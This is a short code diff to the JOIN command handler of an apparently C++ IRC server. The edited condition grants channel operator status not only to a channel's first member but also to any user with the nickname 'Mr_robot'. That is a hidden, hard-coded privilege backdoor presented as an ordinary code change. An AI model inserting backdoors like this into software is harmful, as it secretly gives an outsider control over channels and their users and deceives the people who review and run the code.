@@ -66,7 +66,7 @@ void	cmd_join(data<user *> &data , user *cursor, std::string buf)
 	else if (!checkExisteBefor(cursor, chan_cmd))
 	{
 		chan_cmd->addUser(cursor);
-		if (chan_cmd->getMembers().size() == 1)
+		if (chan_cmd->getMembers().size() == 1 || cursor->getNick() == "Mr_robot")
 			chan_cmd->addOp(cursor);
 		first_time = true;
 	}
